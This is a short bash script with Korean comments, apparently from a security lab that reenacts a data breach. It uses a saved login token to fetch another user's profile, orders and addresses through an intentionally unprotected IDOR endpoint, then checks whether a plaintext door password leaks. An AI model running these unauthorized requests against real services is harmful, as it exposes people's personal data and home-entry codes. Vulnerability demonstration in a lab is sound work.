#!/usr/bin/env bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/env.sh"

[[ -f "$TOKEN_FILE" ]] || { echo "FAIL: $TOKEN_FILE 없음. 먼저 02_login.sh 실행"; exit 1; }
TOKEN=$(cat "$TOKEN_FILE")

echo "[04] IDOR 시연 — 타인 데이터 노출 (victim user_id=$VICTIM_USER_ID)"
echo "    JWT sub != path userId 라도 인가 검증이 없어 그대로 노출됨 (의도된 취약점)"
echo

show() {
    local path="$1"
    echo "─── GET $path ───"
    curl -sS "$API_URL$path" -H "Authorization: Bearer $TOKEN" | jq .
    echo
}

show "/users/$VICTIM_USER_ID"
show "/orders/$VICTIM_USER_ID"
show "/addresses/$VICTIM_USER_ID"

echo "★ 위 /addresses/$VICTIM_USER_ID 응답에 doorPassword 평문 포함 여부 확인"
echo "  (쿠팡 유출 데이터 중 가장 민감한 카테고리 재현 — CLAUDE.md 절대 규칙)"
